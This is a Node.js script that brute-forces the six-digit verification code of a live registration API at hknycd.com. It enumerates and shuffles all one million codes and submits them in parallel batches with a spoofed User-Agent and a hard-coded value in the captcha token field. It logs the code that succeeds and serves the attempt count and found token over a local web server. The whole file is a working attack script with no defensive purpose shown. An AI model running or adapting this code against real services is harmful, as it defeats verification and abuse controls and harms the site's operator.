const Promise = require('bluebird');
const request = Promise.promisifyAll(require('request'));
const leftpad = require('leftpad');
const async = require('async');
const http = require('http')
const port = 1337
require('dotenv').config();


let ran = 0;
let correct = '';

function getVerifyFunc(token) {
  return async (callback) => {
    const formData = {
      lang: 2,
      type: 1,
      is_citizen: 2,
      name: process.env.NAME,
      id_number: process.env.ID_NO,
      contact: process.env.EMAIL,
      verify_token: token,
      token: '88recaptcha',
    };

    const res = await request.postAsync('https://www.hknycd.com/api/v2/register', {
      formData,
      headers: {
        'User-Agent': 'PostmanRuntime/7.21.0'
      }
    })

    ran ++
    if (JSON.parse(res.body).detail[0] !== 'Verification code is incorrect. Please enter again.') {
      correct = token;
      console.error(res.body)
      console.error(token)
      throw new Error(token)
    }    
  }

}

function runSlice(tokens) {
  return new Promise((resolve, reject) => {
    async.parallelLimit(tokens.map(getVerifyFunc), 10, (err) => {
      if (err) {
        reject(err);
      }
      resolve(null);
    })
  })
  
}
async function run() {
  const tokens = [];
  for (let i = 0; i < 1000000; i++) {
    tokens.push(leftpad(`${i}`, 6, '0'))
  }

  tokens.sort((a, b) => Math.random() > 0.5 ? 1 : -1)
  for (let i = 0; i < 1000000; i += 10000) {
    await runSlice(tokens.slice(i, i + 10000))
    console.log(`${i} batch run successfully`)
  }

}

const requestHandler = (request, response) => {
  
  response.end(`attempts: ${ran}. ${correct !== '' ? ' TOKEN=' + correct : ''}`);
}
const server = http.createServer(requestHandler)
server.listen(port, (err) => {
  if (err) {
    return console.log('something bad happened', err)
  }

  console.log(`server is listening on ${port}`)
})

run().then();